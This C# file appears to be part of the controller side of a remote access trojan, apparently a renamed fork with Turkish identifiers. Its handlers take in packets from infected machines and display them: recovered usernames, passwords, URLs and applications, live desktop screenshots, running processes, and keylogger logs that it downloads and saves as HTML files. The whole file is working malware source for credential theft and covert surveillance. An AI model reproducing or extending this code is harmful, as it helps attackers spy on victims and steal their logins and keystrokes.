using System;
using System.IO;
using System.Linq;
using System.Threading;
using xServer.KuuhakuCekirdek.Að;
using xServer.KuuhakuCekirdek.Paketler.ClientPaketleri;
using xServer.KuuhakuCekirdek.Paketler.ServerPaketleri;
using xServer.KuuhakuCekirdek.UTIlityler;
using xServer.KuuhakuCekirdek.Veri;
using xServer.KuuhakuCekirdek.Yardýmcýlar;

namespace xServer.KuuhakuCekirdek.Eylemler
{
    public static partial class EylemÝþleyicisi
    {
        public static void HandleGetPasswordsResponse(Client client, GetPasswordsResponse packet)
        {
            if (client.Value == null || client.Value.FrmPass == null)
                return;

            if (packet.Passwords == null)
                return;

            string userAtPc = string.Format("{0}@{1}", client.Value.KullanýcýAdi, client.Value.PcAdi);

            var lst =
                packet.Passwords.Select(str => str.Split(new[] { DELIMITER }, StringSplitOptions.None))
                    .Select(
                        values =>
                            new KurtarýlanHesaplar
                            {
                                Username = values[0],
                                Password = values[1],
                                URL = values[2],
                                Application = values[3]
                            })
                    .ToList();

            if (client.Value != null && client.Value.FrmPass != null)
                client.Value.FrmPass.AddPasswords(lst.ToArray(), userAtPc);
        }

        public static void HandleGetDesktopResponse(Client client, GetDesktopResponse packet)
        {
            if (client.Value == null
                || client.Value.FrmRdp == null
                || client.Value.FrmRdp.IsDisposed
                || client.Value.FrmRdp.Disposing)
                return;

            if (packet.Image == null)
                return;

            if (client.Value.StreamCodec == null)
                client.Value.StreamCodec = new UnsafeStreamCodec(packet.Quality, packet.Monitor, packet.Resolution);

            if (client.Value.StreamCodec.ImageQuality != packet.Quality ||
                client.Value.StreamCodec.Monitor != packet.Monitor
                || client.Value.StreamCodec.Resolution != packet.Resolution)
            {
                if (client.Value.StreamCodec != null)
                    client.Value.StreamCodec.Dispose();

                client.Value.StreamCodec = new UnsafeStreamCodec(packet.Quality, packet.Monitor, packet.Resolution);
            }

            using (MemoryStream ms = new MemoryStream(packet.Image))
            {
                client.Value.FrmRdp.UpdateImage(client.Value.StreamCodec.DecodeData(ms), true);
            }

            packet.Image = null;

            if (client.Value != null && client.Value.FrmRdp != null && client.Value.FrmRdp.IsStarted)
                new GetDesktop(packet.Quality, packet.Monitor).Execute(client);
        }

        public static void HandleGetProcessesResponse(Client client, GetProcessesResponse packet)
        {
            if (client.Value == null || client.Value.FrmTm == null)
                return;

            client.Value.FrmTm.ClearListviewItems();

            if (packet.Processes == null || packet.IDs == null || packet.Titles == null ||
                packet.Processes.Length != packet.IDs.Length || packet.Processes.Length != packet.Titles.Length)
                return;

            new Thread(() =>
            {
                if (client.Value != null && client.Value.FrmTm != null)
                    client.Value.FrmTm.SetProcessesCount(packet.Processes.Length);

                for (int i = 0; i < packet.Processes.Length; i++)
                {
                    if (packet.IDs[i] == 0 || packet.Processes[i] == "System.exe")
                        continue;

                    if (client.Value == null || client.Value.FrmTm == null)
                        break;

                    client.Value.FrmTm.AddProcessToListview(packet.Processes[i], packet.IDs[i], packet.Titles[i]);
                }
            }).Start();
        }

        public static void HandleGetKeyloggerLogsResponse(Client client, GetKeyloggerLogsResponse packet)
        {
            if (client.Value == null || client.Value.FrmKl == null)
                return;

            if (packet.FileCount == 0)
            {
                client.Value.FrmKl.SetGetLogsEnabled(true);
                return;
            }

            if (string.IsNullOrEmpty(packet.Filename))
                return;

            string downloadPath = Path.Combine(client.Value.DownloadDirectory, "Kayýtlar\\");

            if (!Directory.Exists(downloadPath))
                Directory.CreateDirectory(downloadPath);

            downloadPath = Path.Combine(downloadPath, packet.Filename + ".html");

            var destFile = new FileSplit(downloadPath);

            destFile.AppendBlock(packet.Block, packet.CurrentBlock);

            if ((packet.CurrentBlock + 1) == packet.MaxBlocks)
            {
                try
                {
                    File.WriteAllText(downloadPath, DosyaYardýmcýsý.ReadLogFile(downloadPath));
                }
                catch
                {
                }

                if (packet.Index == packet.FileCount)
                {
                     FileInfo[] iFiles =
                        new DirectoryInfo(Path.Combine(client.Value.DownloadDirectory, "Kayýtlar\\")).GetFiles();

                    if (iFiles.Length == 0)
                        return;

                    foreach (FileInfo file in iFiles)
                    {
                        if (client.Value == null || client.Value.FrmKl == null)
                            break;

                        client.Value.FrmKl.AddLogToListview(file.Name);
                    }

                    if (client.Value == null || client.Value.FrmKl == null)
                        return;

                    client.Value.FrmKl.SetGetLogsEnabled(true);
                }
            }
        }

        public static void HandleGetMonitorsResponse(Client client, GetMonitorsResponse packet)
        {
            if (client.Value == null || client.Value.FrmRdp == null)
                return;

            client.Value.FrmRdp.AddMonitors(packet.Number);
        }
    }
}